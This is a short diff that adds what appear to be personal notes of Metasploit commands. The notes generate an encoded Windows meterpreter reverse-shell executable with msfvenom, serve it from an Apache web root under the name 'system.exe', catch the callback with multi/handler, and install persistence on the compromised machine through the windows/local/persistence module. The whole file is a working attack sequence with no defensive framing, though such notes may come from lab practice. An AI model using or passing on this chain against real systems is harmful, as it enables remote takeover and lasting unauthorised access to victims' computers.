@@ -1,0 +1,23 @@
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=8080 -e X86/call4_dword_xor -i 5 -b "\00\x0a\x0d" -f exe > /var/www/html/system.exe
+service apache2 start
+go to window and download te file
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost 192.168.1.10
+set lport 8080
+exploit
+background
+sessions
+back
+use exploit/windows/local/persistence
+show options
+set sessions 3
+set lhost 192.168.1.10
+set lport 8080
+exploit
+back
+use exploit/multi/handler
+sessions -i 3
+
